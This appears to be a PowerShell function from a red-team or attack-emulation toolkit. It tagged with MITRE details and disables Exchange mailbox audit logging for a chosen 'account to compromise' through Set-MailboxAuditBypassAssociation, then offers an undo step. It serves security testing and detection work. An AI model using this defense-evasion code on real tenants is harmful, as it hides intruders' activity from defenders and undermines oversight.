function DisableMailboxAuditing{

    mitre_details("DisableMailboxAuditing")
    
    EnterAccount("Enter an account to disable auditing for")

    #Enter account to compromise
    $target_account = $global:account_username

    Write-Host "`nRetrieving mailbox current config..." -ForegroundColor Gray
    $current_config = Get-MailboxAuditBypassAssociation -Identity $target_account
    Write-Host "`nMailbox auditing bypass current status: $($current_config.AuditBypassEnabled)" -ForegroundColor Gray

    $user_confirm = Read-Host -Prompt "`nConfirm disbaling audit logging for this account? (yes/no)"

    if ($user_confirm -notin "No","no","N","n") {
        try {
            Write-Host "`nDisabling mailbox auditing for $target_account ..."
            Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $true -ErrorAction Stop
            Write-Host "`nWaiting for changes to take effect..." -ForegroundColor Gray
            Start-Sleep -s 60
            Get-MailboxAuditBypassAssociation -Identity $target_account | Format-Table AuditBypassEnabled
            Write-Host "`n[Success] Let's fly low - Mailbox auditing disabled" -ForegroundColor Yellow
            $allow_undo = $true
        }
        catch {
            Write-Host "`n[Error] Failed to bypass audit logging for account $target_account" -ForegroundColor Red
        }      
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $user_confirm = Read-Host -Prompt "`nWould you like to re-enable audit logging for the account? (yes/no)"

        if ($user_confirm -notin "No","no","N","n") {
            try {
                Write-Host "`nRe-enabling mailbox audit logging for $target_account ..." -ForegroundColor Gray
                Set-MailboxAuditBypassAssociation -Identity $target_account -AuditByPassEnabled $false
                Start-Sleep -s 60    
                Get-MailboxAuditBypassAssociation -Identity $target_account | Format-Table AuditBypassEnabled 
                Write-Host "`n[Undo Success] Re-enabled audit logging" -ForegroundColor Yellow
            }
            catch {
                Write-Host "`n[Undo Error] Failed to re-enable audit logging" -ForegroundColor Red
            }
        }
    }
    Pause
}